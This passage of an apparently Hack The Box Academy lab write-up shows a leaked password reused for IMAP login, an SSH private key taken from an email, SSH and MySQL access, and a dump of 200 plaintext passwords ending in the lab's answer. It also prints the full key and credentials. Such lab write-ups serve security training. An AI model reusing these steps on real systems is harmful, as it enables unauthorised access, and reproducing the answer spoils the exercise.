iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
End of MIB

```

It seems that we have managed to find some sort of credential: `tom NMds732Js2761`.

## Exploring IMAP/POP3
With the credentials on hand, let's enumerate IMAP/POP3.

```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ curl -k 'imaps://10.129.174.189' --user tom:NMds732Js2761 -v
*   Trying 10.129.174.189:993...
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* Server certificate:
*  subject: CN=NIXHARD
*  start date: Nov 10 01:30:25 2021 GMT
*  expire date: Nov  8 01:30:25 2031 GMT
*  issuer: CN=NIXHARD
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to 10.129.174.189 (10.129.174.189) port 993
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AHRvbQBOTWRzNzMySnMyNzYx
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Notes
< * LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren) "." Meetings
< * LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren \UnMarked) "." Important
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.005 + 0.000 + 0.004 secs).
* Connection #0 to host 10.129.174.189 left intact

```

Let's connect to the mail server.
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ openssl s_client -connect 10.129.174.189:993 -quiet -crlf
Connecting to 10.129.174.189
Can't use SSL_get_servername
depth=0 CN=NIXHARD
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=NIXHARD
verify return:1
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
a001 LOGIN tom NMds732Js2761
a001 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
a002 SELECT Notes
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509065] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
a002 OK [READ-WRITE] Select completed (0.015 + 0.000 + 0.014 secs).
a003 FETCH 1:* BODY[]
a003 BAD Error in IMAP command FETCH: Invalid messageset (0.001 + 0.000 secs).
a004 SELECT INBOX
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
a004 OK [READ-WRITE] Select completed (0.006 + 0.000 + 0.005 secs).
a005 FETCH 1:* BODY[]^[[C
a005 BAD Error in IMAP command FETCH: Invalid characters in atom (0.001 + 0.000 secs).
a006 FETCH 1:* BODY[]
* 1 FETCH (BODY[] {3661}
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQqYreqEj6pjTj8wguR0Sd
hfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHFdND3urVhelyuQ89BtJqB
abmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/ong1nlguuJGc1s47tqKBP
HuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZISazgCz/D6IdVMXilAUFKQ
X1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06OqMb9StNGOnkqY8rIHPga
H/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtbDFv9M3j0SjsMTr2Q0B0O
jKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmpNrS7qSjxO0N143zMRDZy
Ex74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpAVj6YYkMDtL86RN6o8u1x
3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVeoYK9OJJ3hJeJ7SpCt2GG
cAAAdIRrOunEazrpwAAAAHc3NoLXJzYQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxy
U9XWTS+UBbY3lVFH0t+F+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQ
qYreqEj6pjTj8wguR0SdhfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHF
dND3urVhelyuQ89BtJqBabmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/o
ng1nlguuJGc1s47tqKBPHuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZIS
azgCz/D6IdVMXilAUFKQX1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06O
qMb9StNGOnkqY8rIHPgaH/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtb
DFv9M3j0SjsMTr2Q0B0OjKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmp
NrS7qSjxO0N143zMRDZyEx74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpA
Vj6YYkMDtL86RN6o8u1x3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVe
oYK9OJJ3hJeJ7SpCt2GGcAAAADAQABAAACAQC0wxW0LfWZ676lWdi9ZjaVynRG57PiyTFY
jMFqSdYvFNfDrARixcx6O+UXrbFjneHA7OKGecqzY63Yr9MCka+meYU2eL+uy57Uq17ZKy
zH/oXYQSJ51rjutu0ihbS1Wo5cv7m2V/IqKdG/WRNgTFzVUxSgbybVMmGwamfMJKNAPZq2
xLUfcemTWb1e97kV0zHFQfSvH9wiCkJ/rivBYmzPbxcVuByU6Azaj2zoeBSh45ALyNL2Aw
HHtqIOYNzfc8rQ0QvVMWuQOdu/nI7cOf8xJqZ9JRCodiwu5fRdtpZhvCUdcSerszZPtwV8
uUr+CnD8RSKpuadc7gzHe8SICp0EFUDX5g4Fa5HqbaInLt3IUFuXW4SHsBPzHqrwhsem8z
tjtgYVDcJR1FEpLfXFOC0eVcu9WiJbDJEIgQJNq3aazd3Ykv8+yOcAcLgp8x7QP+s+Drs6
4/6iYCbWbsNA5ATTFz2K5GswRGsWxh0cKhhpl7z11VWBHrfIFv6z0KEXZ/AXkg9x2w9btc
dr3ASyox5AAJdYwkzPxTjtDQcN5tKVdjR1LRZXZX/IZSrK5+Or8oaBgpG47L7okiw32SSQ
5p8oskhY/He6uDNTS5cpLclcfL5SXH6TZyJxrwtr0FHTlQGAqpBn+Lc3vxrb6nbpx49MPt
DGiG8xK59HAA/c222dwQAAAQEA5vtA9vxS5n16PBE8rEAVgP+QEiPFcUGyawA6gIQGY1It
4SslwwVM8OJlpWdAmF8JqKSDg5tglvGtx4YYFwlKYm9CiaUyu7fqadmncSiQTEkTYvRQcy
tCVFGW0EqxfH7ycA5zC5KGA9pSyTxn4w9hexp6wqVVdlLoJvzlNxuqKnhbxa7ia8vYp/hp
6EWh72gWLtAzNyo6bk2YykiSUQIfHPlcL6oCAHZblZ06Usls2ZMObGh1H/7gvurlnFaJVn
CHcOWIsOeQiykVV/l5oKW1RlZdshBkBXE1KS0rfRLLkrOz+73i9nSPRvZT4xQ5tDIBBXSN
y4HXDjeoV2GJruL7qAAAAQEA/XiMw8fvw6MqfsFdExI6FCDLAMnuFZycMSQjmTWIMP3cNA
2qekJF44lL3ov+etmkGDiaWI5XjUbl1ZmMZB1G8/vk8Y9ysZeIN5DvOIv46c9t55pyIl5+
fWHo7g0DzOw0Z9ccM0lr60hRTm8Gr/Uv4TgpChU1cnZbo2TNld3SgVwUJFxxa//LkX8HGD
vf2Z8wDY4Y0QRCFnHtUUwSPiS9GVKfQFb6wM+IAcQv5c1MAJlufy0nS0pyDbxlPsc9HEe8
EXS1EDnXGjx1EQ5SJhmDmO1rL1Ien1fVnnibuiclAoqCJwcNnw/qRv3ksq0gF5lZsb3aFu
kHJpu34GKUVLy74QAAAQEA+UBQH/jO319NgMG5NKq53bXSc23suIIqDYajrJ7h9Gef7w0o
eogDuMKRjSdDMG9vGlm982/B/DWp/Lqpdt+59UsBceN7mH21+2CKn6NTeuwpL8lRjnGgCS
t4rWzFOWhw1IitEg29d8fPNTBuIVktJU/M/BaXfyNyZo0y5boTOELoU3aDfdGIQ7iEwth5
vOVZ1VyxSnhcsREMJNE2U6ETGJMY25MSQytrI9sH93tqWz1CIUEkBV3XsbcjjPSrPGShV/
H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
)
a006 OK Fetch completed (0.005 + 0.000 + 0.004 secs).
```

We found a private key, which we can potentially use to SSH into the machine.

## Exploring SSH
We copy the discovered private key into a `id_rsa` file and then we attempt to SSH into the machine as user `tom`.

```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ vim id_rsa
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ chmod 600 id_rsa 
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-lgu5je84k2]─[~]
└──╼ [★]$ ssh -i id_rsa tom@10.129.174.189
The authenticity of host '10.129.174.189 (10.129.174.189)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.174.189' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 01 Sep 2026 09:22:56 AM UTC

  System load:  0.03              Processes:               185
  Usage of /:   66.4% of 5.70GB   Users logged in:         0
  Memory usage: 32%               IPv4 address for ens192: 10.129.174.189
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
tom@NIXHARD:~$
```

We managed to SSH into the machine. Let's explore the directory.
```bash
tom@NIXHARD:~$ ls -al
total 48
drwxr-xr-x 6 tom  tom  4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 tom  tom   532 Nov 10  2021 .bash_history
-rw-r--r-- 1 tom  tom   220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Nov 10  2021 .bashrc
drwx------ 2 tom  tom  4096 Nov 10  2021 .cache
drwx------ 3 tom  tom  4096 Nov 10  2021 mail
drwx------ 8 tom  tom  4096 Sep  1 09:18 Maildir
-rw------- 1 tom  tom   169 Nov 10  2021 .mysql_history
-rw-r--r-- 1 tom  tom   807 Nov 10  2021 .profile
drwx------ 2 tom  tom  4096 Nov 10  2021 .ssh
-rw------- 1 tom  tom  2018 Nov 10  2021 .viminfo

```

There seems to be a MySQL server running in the system.

## Exploring MySQL
```bash
tom@NIXHARD:~$ cat .mysql_history
_HiStOrY_V2_
show\040databases;
select\040*\040from\040users;
use\040users;
select\040*\040from\040users;
show\040databases;
use\040users;
select\040*\040from\040users;
```
From the `mysql` history file, there seems to be a database called `users`. Let's try to connect to `mysql` in the system:

```bash
tom@NIXHARD:~$ mysql -u tom -pNMds732Js2761
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

We could access the `mysql` interface. Let's enumerate the databases and see what information we can access.
```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.03 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+------+-------------------+------------------------------+
| id   | username          | password                     |
+------+-------------------+------------------------------+
|    1 | ppavlata0         | 6znAfvTbB2                   |
|    2 | ktofanini1        | TP2NxFD62e                   |
|    3 | rallwell2         | t1t7WaqvEfv                  |
|    4 | efernier3         | ZRYOBO9PI                    |
|    5 | fpoon4            | 5Spyx2Jb                     |
|    6 | jgurnell5         | LMCnWKD                      |
|    7 | aminter6          | ngCyGg3                      |
|    8 | dwattinham7       | H2bpGC5                      |
|    9 | ddumphreys8       | eGek5Q8                      |
|   10 | etookey9          | kXBd88ZX                     |
|   11 | mlindbacka        | H9uTnIvli92                  |
|   12 | awebbeb           | RALeM2IfuwA                  |
|   13 | tswannellc        | oHdZWwO9                     |
|   14 | slydiattd         | r3wRgn                       |
|   15 | cparslowe         | nVdJAHr                      |
|   16 | sheartfieldf      | ofTf0hE7OL                   |
|   17 | aalvesg           | diTzuE                       |
|   18 | eshilstoneh       | NVSRa5L8Lx                   |
|   19 | eludovicoi        | w2uUtLGYkDi                  |
|   20 | rcoppenhallj      | 8T1AO16C4pm                  |
|   21 | rfuxmank          | oOVWyPyo                     |
|   22 | tmoraledal        | CDNj7KH                      |
|   23 | vdurdanm          | KBM4BTldF                    |
|   24 | mlandisn          | oCOZcC                       |
|   25 | gfancutto         | RNHlBaFKLLt                  |
|   26 | dfigliovannip     | Cf7T9osx                     |
|   27 | ngoedeq           | eDfTnH                       |
|   28 | abalhamr          | Qc2Tia0zM                    |
|   29 | tmartys           | VC65xd6o                     |
|   30 | sallewellt        | Y5VSv1rm                     |
|   31 | mjoveyu           | ej3amn                       |
|   32 | mgoodlifev        | lCbzNIw7B90                  |
|   33 | gmargeramw        | hbVF2G                       |
|   34 | leberlex          | Nj6UCAQ                      |
|   35 | mtrimbyy          | jfNkfg5ZW                    |
|   36 | mkimmz            | pZZepTCVlkN                  |
|   37 | mflaunier10       | 9TZ8mfLA                     |
|   38 | vgomes11          | qM6nHjMtD                    |
|   39 | sbrimham12        | FoXudHc4Ocr                  |
|   40 | cbendle13         | zFUIGVBx                     |
|   41 | ralgeo14          | YTB8IXOk                     |
|   42 | rsandyfirth15     | vARbkPRQv                    |
|   43 | bcarlesi16        | m4H6q6pH                     |
|   44 | cfrude17          | Za8UHiSe25N                  |
|   45 | rjullian18        | 6QyxSjg                      |
|   46 | bgissing19        | fjes6w8Ovw0                  |
|   47 | limore1a          | gVzkv8syQ                    |
|   48 | scarlisle1b       | sR9rPBL5                     |
|   49 | hamoss1c          | tbmK9XBhn57j                 |
|   50 | cradmore1d        | TQkfKxEl7                    |
|   51 | apetican1e        | ABibihOvMOu                  |
|   52 | eweber1f          | sEDynNORm7b                  |
|   53 | nbockmaster1g     | M1tVaH                       |
|   54 | cianne1h          | Vc8agpinq                    |
|   55 | khatchette1i      | xXOnQFOsF0I                  |
|   56 | tkroger1j         | uisR7g1eVEU                  |
|   57 | sgladtbach1k      | iIVQ4l                       |
|   58 | bmockford1l       | BBsZPmwk0r                   |
|   59 | balabone1m        | aTUbGm0                      |
|   60 | jmantripp1n       | DTVAdvbadbA2                 |
|   61 | tchown1o          | dCulXiBc                     |
|   62 | vconradsen1p      | v5E0sgqzo                    |
|   63 | hfudge1q          | cSODbEMtCm                   |
|   64 | syaneev1r         | ilXo6tKGHY7                  |
|   65 | btheyer1s         | LxNk1t                       |
|   66 | fcahn1t           | oSBmcLx                      |
|   67 | edurrington1u     | LMomwfQkq3                   |
|   68 | kcounter1v        | 1zUE6RHS                     |
|   69 | bqueripel1w       | 0A2OfeQPnhd                  |
|   70 | mnacci1x          | lNyUiY8U4t                   |
|   71 | dcabell1y         | W6Q7R3zsxB                   |
|   72 | ctaleworth1z      | d3JWwTj                      |
|   73 | mmcgrah20         | yPxlvhS                      |
|   74 | jgannaway21       | oGfIrDxkSIo                  |
|   75 | eiacovone22       | 8jKlhgvC                     |
|   76 | rnaughton23       | Gyf6awYCm4                   |
|   77 | adobbins24        | ashZ0G                       |
|   78 | pwarbeys25        | nSmfKSYW9GL                  |
|   79 | bbrabbins26       | YZWuH6D8Q                    |
|   80 | adandy27          | dF1VPsn                      |
|   81 | mfarrens28        | ucPclA8K9c                   |
|   82 | dhaysar29         | MeGzIGeyKXyw                 |
|   83 | efoot2a           | Q2ks5eg                      |
|   84 | tpelosi2b         | 8yjhdx                       |
|   85 | binman2c          | 3uO3PeL8e                    |
|   86 | krait2d           | EFD5FpEtu2                   |
|   87 | jcrook2e          | VFsdmvhDz4O                  |
|   88 | falonso2f         | 4ifO54                       |
|   89 | jmacak2g          | KUDAxTXU                     |
|   90 | nnorville2h       | WCYa9C1G                     |
|   91 | tlevington2i      | If46bHoGr                    |
|   92 | abartak2j         | erFX4u0e0                    |
|   93 | jgoad2k           | gunnsPy1pMCd                 |
|   94 | dwadham2l         | 89IiRFy0frst                 |
|   95 | hvenditti2m       | NS0U18XON                    |
|   96 | gpitchers2n       | j7RVE2                       |
|   97 | aiskowitz2o       | 8iVpSQUEXn2K                 |
|   98 | gcars2p           | 8i3nsQU9wp                   |
|   99 | bjacke2q          | 2PtrA0C                      |
|  100 | fstorton2r        | XmjbfR1vK1                   |
|  101 | pbrinded2s        | Jf9uWJ                       |
|  102 | penriques2t       | o3kmQ5zHF5Qb                 |
|  103 | awinckworth2u     | LEwOydD3nncQ                 |
|  104 | lkinsell2v        | kvoIZupHNt                   |
|  105 | wdavisson2w       | nk5HVS                       |
|  106 | rrenzini2x        | LiCJccRxumYU                 |
|  107 | kdavys2y          | ZXpRVEn                      |
|  108 | ravann2z          | YLkKN4JzzM                   |
|  109 | hrallings30       | 6wS4x0IeLW                   |
|  110 | sbrackpool31      | lBa8AVaPQg                   |
|  111 | epulham32         | yIV88FM9DM                   |
|  112 | mspeachley33      | JSa9aUv1h                    |
|  113 | vforkan34         | 26Q6gTgsOE8T                 |
|  114 | jprichard35       | sggVPPMfRA3T                 |
|  115 | abisatt36         | GcSlKIuky                    |
|  116 | todocherty37      | BwSfFV3qj                    |
|  117 | njayne38          | D8yr44NNQ                    |
|  118 | gwhyman39         | h0WJ4p2F2x8                  |
|  119 | lkristoffersson3a | mARndSF                      |
|  120 | lmcallan3b        | gmpkAKF                      |
|  121 | kdouble3c         | qYtstjmdR                    |
|  122 | sgooding3d        | venooIUMMHE                  |
|  123 | lgaffney3e        | 1fCwgoaCtz                   |
|  124 | emuriel3f         | Wz582Y22                     |
|  125 | mlamasna3g        | MhqsPNMRYwJE                 |
|  126 | omander3h         | CuB3JbXJ                     |
|  127 | fropkes3i         | jVBeawjIPXS                  |
|  128 | mhawk3j           | g0sPpI8                      |
|  129 | wseres3k          | zgsXeR7blA                   |
|  130 | bflaws3l          | 0dTvgBkaFYqi                 |
|  131 | ccyson3m          | EtCscA                       |
|  132 | afowell3n         | cRG0x5                       |
|  133 | jmolian3o         | fCwa9ry                      |
|  134 | gterzo3p          | Srv77g                       |
|  135 | ravrahamy3q       | dFjfFMEJ                     |
|  136 | amaden3r          | n1WAtKT                      |
|  137 | gdeverall3s       | 1Vj3bbr                      |
|  138 | ejansema3t        | 4MyiArdEVq                   |
|  139 | snormanville3u    | l1s9Ao9omd                   |
|  140 | nfinder3v         | Rd1POwc3                     |
|  141 | lrodway3w         | UNW82GQfd0q                  |
|  142 | lstening3x        | JaSkROwU83UB                 |
|  143 | hemer3y           | GlPpKB                       |
|  144 | eblamphin3z       | 7Zjz7RvcC9x                  |
|  145 | lwederell40       | eyWsJl                       |
|  146 | nverick41         | Mr1r2H                       |
|  147 | mlawlie42         | XrHEZJbuUd                   |
|  148 | swahlberg43       | 46gOiZ                       |
|  149 | crubinivitz44     | FLlYii1mQz84                 |
|  150 | HTB               | cr3n4o7rzse7rzhnckhssncif7ds |
|  151 | wdoswell46        | FYXMuelBVcS                  |
|  152 | ccollingwood47    | LM6SU2N3w7KQ                 |
|  153 | nfoux48           | N40DfFww                     |
|  154 | gboyat49          | W1LDy7                       |
|  155 | csuddick4a        | UIGXl3lL                     |
|  156 | tmatieu4b         | c5PYl7yfJi                   |
|  157 | ielsy4c           | 3hLC705Oj                    |
|  158 | ebotwood4d        | aQmW5c7                      |
|  159 | gcirlos4e         | SPsU9obCa                    |
|  160 | smucklestone4f    | Ho96mUx                      |
|  161 | hdain4g           | BGMRtb                       |
|  162 | dmcquillin4h      | 37kwHEdFhAlL                 |
|  163 | gfolan4i          | 1d9kcofM                     |
|  164 | gtamlett4j        | 4HlL18RM37l3                 |
|  165 | cchapelle4k       | xezsRgOt8OW8                 |
|  166 | channy4l          | 68lHKp                       |
|  167 | ffennick4m        | jNLpCeyoYY                   |
|  168 | mmcgarrell4n      | Ttvat7WvkI                   |
|  169 | mmcdowell4o       | jfOR6B                       |
|  170 | sconquer4p        | ase5Qid5vWD                  |
|  171 | hskune4q          | UUoqC30g5w                   |
|  172 | mblasli4r         | dcjNDHzrA                    |
|  173 | sefford4s         | ui0r4FKwD38                  |
|  174 | gscotter4t        | f2vUKUzHLmEW                 |
|  175 | nmenhenitt4u      | gXHceINuKdF                  |
|  176 | laldridge4v       | 7o4agC3m                     |
|  177 | rlingner4w        | 8mYREIR7                     |
|  178 | mmcfall4x         | sd3N0GDK                     |
|  179 | smoscon4y         | BCPAyKFkKKL                  |
|  180 | ggillespey4z      | LHyQ7f4Br                    |
|  181 | onewberry50       | aKdinUPQ9r                   |
|  182 | dinsley51         | hy8agAF9c4VS                 |
|  183 | mcommon52         | Buh2VR                       |
|  184 | bmosdill53        | IgNAGOBrzlu                  |
|  185 | rrobart54         | SkBqsiQGSK                   |
|  186 | hdurrance55       | 1cljoZoy7Fc                  |
|  187 | hwinterflood56    | F9PH0X0                      |
|  188 | jbier57           | Ug88Nd37N96v                 |
|  189 | hmaccumeskey58    | 3rb3rz2kq2                   |
|  190 | orangell59        | IWz01iHsv                    |
|  191 | velsie5a          | mWcslVm2                     |
|  192 | igeorgelin5b      | 6WHS6OS                      |
|  193 | rrushsorth5c      | hXiQn9bW6W                   |
|  194 | mbrucker5d        | cT5Z6K                       |
|  195 | darnull5e         | EzagIo6Sd                    |
|  196 | jparkhouse5f      | HCEchNzf                     |
|  197 | smcgunley5g       | 9ivT96O                      |
|  198 | ssoal5h           | qi6WX7TGIA                   |
|  199 | npeak5i           | 3gR7Iuc0                     |
|  200 | mleidl5j          | qwfjY9RGk6                   |
+------+-------------------+------------------------------+
200 rows in set (0.01 sec)
```

HTB's password is `cr3n4o7rzse7rzhnckhssncif7ds`.